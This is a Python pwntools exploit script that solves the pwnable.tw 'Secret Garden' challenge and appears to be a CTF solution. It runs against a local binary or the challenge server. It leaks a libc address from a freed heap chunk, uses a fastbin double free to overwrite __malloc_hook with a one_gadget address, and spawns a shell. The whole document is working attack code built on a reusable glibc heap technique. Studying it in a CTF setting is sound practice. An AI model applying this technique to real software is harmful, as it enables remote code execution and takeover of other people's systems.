from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_secret_garden")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwnabletw_secret_garden")
else:
	p = remote("chall.pwnable.tw","10203")
	libc = ELF("./libc_64.so.6")
	elf = ELF("./pwnabletw_secret_garden")

def add(size,name,color):
	p.sendafter("Your choice : ","1")
	p.sendlineafter("name :",str(size))
	p.sendafter("flower :",name)
	p.sendlineafter("flower :",color)
	p.recvuntil("Successful !\n")

def show():
	p.sendafter("Your choice : ","2")

def free(index):
	p.sendafter("Your choice : ","3")
	p.sendlineafter("garden:",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1080)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
add(0x80,"a","s1") #0
add(0x28,"junk","junk") #1
add(0x60,"b","s2") #2
free(0)
free(1)
add(0x80,"c"*8,"s3") #3
show()
p.recvuntil("c"*8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(0x60,"e","s5") #4
free(2)
free(4)
free(2)
add(0x60,p64(libc.symbols["__malloc_hook"] - 0x23),"s6") #4
add(0x60,"a","a")
add(0x60,"a","a")
if debug:
	one_gadget = libc.address + 0xf02a4
	payload = "a"*0xb + p64(one_gadget) + p64(libc.symbols["__libc_realloc"] + 0x14)
else:
	one_gadget = libc.address + 0xef6c4
	payload = "aaa" + p64(0) * 2 + p64(one_gadget)
#payload = "aaa" + p64(libc.address + 0x4526a)*2 + p64(libc.address + 0x846D0)
add(0x60,payload,"a")
#debugf()
if debug:
	p.sendafter("Your choice : ","1")
else:
	free(3)
	free(3)
p.interactive()

